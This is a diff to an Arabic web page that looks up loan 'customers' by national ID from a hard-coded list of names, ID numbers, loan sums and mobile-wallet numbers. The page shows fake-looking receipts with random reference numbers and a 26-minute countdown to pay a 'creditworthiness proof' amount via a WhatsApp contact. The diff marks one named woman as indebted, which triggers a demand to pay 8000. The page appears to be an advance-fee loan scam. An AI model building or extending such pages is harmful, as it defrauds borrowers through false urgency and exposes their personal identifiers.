@@ -37,7 +37,6 @@
             position: relative;
             min-height: 100vh;
         }
-        /* شبكة خلفية متحركة */
         body::before {
             content: '';
             position: fixed;
@@ -64,7 +63,6 @@
             position: relative;
             z-index: 3;
         }
-        /* هيدر متوهج */
         header {
             text-align: center;
             margin-bottom: 2rem;
@@ -117,7 +115,6 @@
             box-shadow: 0 0 12px rgba(0, 240, 255, 0.3);
             backdrop-filter: blur(4px);
         }
-        /* بطاقة البحث */
         .search-card {
             background: linear-gradient(145deg, rgba(24, 27, 44, 0.9), rgba(12, 14, 25, 0.9));
             backdrop-filter: blur(12px);
@@ -173,7 +170,6 @@
             box-shadow: 0 0 12px rgba(0, 240, 255, 0.5);
         }
         .btn-search:hover { transform: scale(1.02); box-shadow: 0 0 22px cyan; }
-        /* بطاقة الدفع المحسنة */
         .receipt-card {
             background: linear-gradient(135deg, #181f2c, #0f1322);
             border-radius: 2rem;
@@ -216,7 +212,6 @@
             border-bottom: 1px dotted rgba(255,255,255,0.2);
             padding: 0.6rem 0;
         }
-        /* عدَّاد متوهج 26 دقيقة */
         .timer-section {
             background: radial-gradient(circle, rgba(255,215,0,0.1), transparent);
             border: 1px solid var(--accent-gold);
@@ -270,7 +265,6 @@
             font-size: 1rem;
         }
         .btn-whatsapp-suspend:hover { transform: scale(1.02); box-shadow: 0 0 18px #25D366; }
-        /* باقي التحسينات */
         .footer-info { text-align: center; font-size: 0.75rem; margin-top: 2rem; opacity: 0.8; }
         @media (max-width: 680px) {
             .timer { font-size: 2rem; }
@@ -304,7 +298,7 @@
     </div>
 
     <script>
-        // قاعدة العملاء (كما هي من الملف مع العملاء المعلقة)
+        // قاعدة العملاء (تم تعديل ام هاشم لتصبح مدانة)
         const customersDatabase = {
             "28703111100311": { name: "محمد محمد مصطفي صيام", loan: 150000, wallet: "فودافون كاش", walletNum: "01001602909", suspended: false },
             "28906270200731": { name: "محمد احمد عبدالله عبدالقادر", loan: 145000, wallet: "لا يوجد محفظة", walletNum: "01283498080", suspended: false },
@@ -320,7 +314,7 @@
             "27707070106815": { name: "وليد معوض موسى شرقاوي", loan: 70000, wallet: "فودافون كاش", walletNum: "01019114882", suspended: false },
             "27404210101395": { name: "محمد عبدالوهاب ابراهيم", loan: 50000, wallet: "فودافون كاش", walletNum: "01017693528", suspended: false },
             "28911202105597": { name: "علاء الدين حاتم محمد عبدالسلام", loan: 200000, wallet: "فودافون كاش", walletNum: "01055119921", suspended: false },
-            "28501101304005": { name: "ام هاشم محمد ابراهيم احمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01032750952", suspended: false },
+            "28501101304005": { name: "ام هاشم محمد ابراهيم احمد", loan: 200000, wallet: "فودافون كاش", walletNum: "01032750952", suspended: true, isSpecialDebt: true }, // تم التعديل: أصبحت مدانة
             "28004031602115": { name: "رضا فتح الله محمد العطار", loan: 190000, wallet: "فودافون كاش", walletNum: "01001813379", suspended: false },
             "278030613079": { name: "محمد عبدالله حسين حسين", loan: 200000, wallet: "فودافون كاش", walletNum: "01007197584", suspended: false },
             "2911007055": { name: "محمد حسني احمد محمد", loan: 85000, wallet: "فودافون كاش", walletNum: "01016090373", suspended: false },
@@ -337,7 +331,6 @@
         function formatTime(date) { return date.toLocaleTimeString('ar-EG', { hour:'2-digit', minute:'2-digit' }); }
         let timerInterval = null;
 
-        // دالة إنشاء بطاقة الدفع المحترفة
         function buildPaymentCard(customer, details, proofAmount, receiptMinutes) {
             const now = new Date();
             const refNum = Math.floor(Math.random()*1e9);
@@ -368,9 +361,7 @@
             `;
         }
 
-        // قسم إثبات الجدارة بعد 26 دقيقة متوهجة
         function buildCreditworthiness(customer, proofAmount, details, receiptMinutes) {
-            const remainingSeconds = 26 * 60; // 26 دقيقة -> 1560 ثانية
             return `
                 <div class="creditworthiness-section">
                     <div class="section-title"><i class="fas fa-certificate"></i> إثبات الجدارة الائتمانية</div>
@@ -388,7 +379,6 @@
                         </ul>
                     </div>
 
-                    <!-- الكاونتر المتوهج 26 دقيقة -->
                     <div class="timer-section">
                         <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لإثبات الجدارة</div>
                         <div class="timer" id="proofTimer">26:00</div>
@@ -417,11 +407,10 @@
             window.open(`https://wa.me/212614494251?text=${encodeURIComponent(msg)}`, '_blank');
         }
 
-        // عرض العملاء العاديين + عداد 26 دقيقة
         function displayResult(customer) {
             const details = getLoanDetails(customer.loan);
             const proofAmount = calculateProofAmount(customer.loan);
-            const receiptMinutes = Math.floor(Math.random() * 6) + 5; // 5-10 دقائق
+            const receiptMinutes = Math.floor(Math.random() * 6) + 5;
             const paymentHTML = buildPaymentCard(customer, details, proofAmount, receiptMinutes);
             const creditHTML = buildCreditworthiness(customer, proofAmount, details, receiptMinutes);
             const fullHTML = `<div>${paymentHTML}${creditHTML}</div>`;
@@ -432,10 +421,9 @@
             start26MinTimer();
         }
 
-        // دالة العداد المتوهج 26 دقيقة
         function start26MinTimer() {
             if (timerInterval) clearInterval(timerInterval);
-            let secondsLeft = 26 * 60; // 1560 ثانية
+            let secondsLeft = 26 * 60;
             const timerElement = document.getElementById('proofTimer');
             if (!timerElement) return;
             timerInterval = setInterval(() => {
@@ -453,7 +441,6 @@
             }, 1000);
         }
 
-        // عرض حالة الإدانة (نفس الرسالة مع تعديل)
         function displaySuspendedMessage(customer) {
             const required = 8000;
             const msgHTML = `
